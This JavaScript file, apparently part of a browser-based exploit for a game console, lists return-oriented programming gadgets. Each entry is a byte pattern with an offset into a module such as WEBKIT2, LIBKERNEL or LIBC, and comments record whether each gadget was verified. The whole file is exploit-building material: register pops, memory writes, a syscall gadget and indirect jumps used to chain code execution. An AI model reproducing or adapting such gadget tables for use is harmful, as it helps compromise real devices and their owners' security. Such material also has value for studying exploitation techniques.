var gadgets = {
	"pop rbp": new gadget([0x5d], WEBKIT2, 0x18E7834), // checked ok
	
	"pop rax": new gadget([0x58], WEBKIT2, 0x18E77F4), // checked OK
	"pop rcx": new gadget([0x59], WEBKIT2, 0x18E77F8), // checked OK
	"pop rdx": new gadget([0x5a, 0xff, 0xc5], WEBKIT2, 0x18E7800), //checked OK
	
	"pop rsi": new gadget([0x5e], WEBKIT2, 0x18E783C), //checked ok
	"pop rdi": new gadget([0x5f], WEBKIT2, 0x18E7840), //checked ok
	/*
	"pop r8": new gadget([0x41, 0x58], WEBKIT2, 0xB78FD), //not checked										
	"pop r9": new gadget([0x43, 0x59], WEBKIT2, 0x1D90204), //not checked
	*/
	"pop rsp": new gadget([0xf3, 0x5c], WEBKIT2, 0x1B5BB39), //checked OK
 
	"mov r10, rcx; syscall": new gadget([0x49, 0x89, 0xca, 0x0f, 0x05], LIBKERNEL, 0x417), //checked OK
 
	"mov [rax+0x1e8], rdx": new gadget([0x48, 0x89, 0x90, 0xe8, 0x01, 0x00, 0x00], LIBKERNEL, 0x15A2), //checked OK
	"mov [rax+0x60], rdi": new gadget([0x48, 0x89, 0x78, 0x60], WEBKIT2, 0x2B32B4), //checked OK
	"mov [rax+0x8], rsi": new gadget([0x48, 0x89, 0x70, 0x08], LIBKERNEL, 0xA3D4), //checked OK
	"mov [rax+0xc0], rcx": new gadget([0x48, 0x89, 0x88, 0xc0, 0x00, 0x00, 0x00], WEBKIT2, 0x365B2D), //ok
	"mov [rax], rcx": new gadget([0x48, 0x89, 0x08], WEBKIT2, 0x54e3f), //ok
	"mov [rax], rdx": new gadget([0x48, 0x89, 0x10], WEBKIT2, 0x75a36), //ok
	"mov [rax], rsi": new gadget([0x48, 0x89, 0x30], WEBKIT2, 0x2dc1b8), //ok
 
	//"mov [rax], dh": new gadget([], WEBKIT2, 0x1400B7), // not checked
 
	"mov [rcx], rax": new gadget([0x48, 0x89, 0x01], WEBKIT2, 0xC0F0), //ok
	"mov [rcx], rdx": new gadget([0x48, 0x89, 0x11], WEBKIT2, 0xBEB1F0),//ok
 
	"mov [rdx], rcx": new gadget([0x48, 0x89, 0x0a], WEBKIT2, 0xa71e6c),//ok
	"mov [rdx], rsi": new gadget([0x48, 0x89, 0x32], WEBKIT2, 0x361817),//ok
 
	"mov [rsi+0x18], rax": new gadget([0x48, 0x89, 0x46, 0x18], WEBKIT2, 0x464E5), //ok
	//"mov [rsi+0x8], r8": new gadget([0x4c, 0x89, 0x46, 0x08], WEBKIT2, 0x1481D0),// not checked
	"mov [rsi], rcx": new gadget([0x48, 0x89, 0x0e], WEBKIT2, 0x387DFF),//ok
 
	"mov [rdi], rax": new gadget([0x48, 0x89, 0x07], WEBKIT2, 0x1694CC), //ok
	"mov [rdi+0x88], rax": new gadget([0x48, 0x89, 0x87, 0x88, 0x00, 0x00, 0x00], WEBKIT2, 0x1BC7C3),//ok
	"mov [rdi+0xa0], rcx": new gadget([0x48, 0x89, 0x8f, 0xa0, 0x00, 0x00, 0x00], WEBKIT2, 0xB485),//ok
	"mov [rdi+0x80], rdx": new gadget([0x48, 0x89, 0x97, 0x80, 0x00, 0x00, 0x00], WEBKIT2, 0xC0F2B4),//ok 
	"mov [rdi+0x80], rsi": new gadget([0x48, 0x89, 0xb7, 0x80, 0x00, 0x00, 0x00], WEBKIT2, 0x3D6460),//k
	"mov [rdi+0x20], r8": new gadget([0x4c, 0x89, 0x47, 0x20], SCEPIGLET, 0x339F6), //checked OK
	"mov [rdi+0x20], rdx": new gadget([0x48, 0x89, 0x57, 0x20], WEBKIT2, 0xB54EB),//k
 
	"mov [r10], rdi": new gadget([0x49, 0x89, 0x3a], SCESSL, 0x1B1D4), //should be ok
	"mov [r10], rdx": new gadget([0x49, 0x89, 0x12], SCESSL, 0x1AF2B), //should be ok
	"mov [r10], rsi": new gadget([0x49, 0x89, 0x32], SCESSL, 0x1B05D), //should be ok
 
	"mov rdi, [rdi+0x48]": new gadget([0x48, 0x8b, 0x7f, 0x48], LIBC, 0x66C68), // checked OK
	"mov rsi, rax; jmp rcx": new gadget([], WEBKIT2, 0xEDF10), //k
 
	//"mov rax, [rax+0x830]": new gadget([0x48, 0x8b, 0x80, 0x30, 0x08, 0x00, 0x00], WEBKIT2, 0x9594D2),//not checked
	"mov rax, [rdi]": new gadget([0x48, 0x8b, 0x07], LIBKERNEL, 0x1bcc0), //checked OK
	"mov rax, [rdi+0x18]": new gadget([0x48, 0x8b, 0x47, 0x18], LIBKERNEL, 0x1BD00), //checked OK
	"mov rax, [r10]": new gadget([0x49, 0x8b, 0x02], WEBKIT2, 0xdeb798), //k
	"mov rax, [r11]": new gadget([0x49, 0x8b, 0x03], SCESSL, 0xd096), //checked OK
 
	"mov rdx, [rdi+0x8]": new gadget([0x48, 0x8b, 0x57, 0x08], LIBC, 0x64f3), //checked OK
 
	"mov rax, rdi": new gadget([0x48, 0x89, 0xf8], LIBKERNEL, 0x51b3),//checked OK
	"mov rax, rsi": new gadget([0x48, 0x89, 0xf0], LIBKERNEL, 0xa491),//checked OK
	"mov rax, r8": new gadget([0x4c, 0x89, 0xc0], WEBKIT2, 0x98731a),//ok
 
	"mov rdx, rdi": new gadget([0x48, 0x89, 0xfa], WKP, 0x807), //checked OK
 
 /*
	"add ah, byte [rax]": new gadget([], WEBKIT2, 0xF4656F),//not checked
	"add edi, dword [rcx]": new gadget([], WEBKIT2, 0xF69832), //not checked
 */
	"call rax": new gadget([], LIBKERNEL, 0x48), //NO RET? <- needs analysis
	"call rbx": new gadget([], LIBKERNEL, 0x13206), //no ret <- needs analysis
	"call rcx": new gadget([], LIBC, 0x7A98B), //no ret<- needs analysis
	"call rdx": new gadget([], LIBKERNEL, 0x1e289), // NO RET?
	"call rsi": new gadget([], LIBKERNEL, 0x13588), // no ret
 
	"jmp rax": new gadget([], LIBKERNEL, 0x6f35),// NO RET?
	//"jmp rbx": new gadget([], LIBKERNEL, 0x1280d), //not checked
	"jmp rcx": new gadget([], LIBKERNEL, 0xD176), //no ret
	"jmp rdx": new gadget([], LIBKERNEL, 0x13220), // NO RET?
 
	"ret": new gadget([], WEBKIT2, 0x24C2BA1), // checked OK
}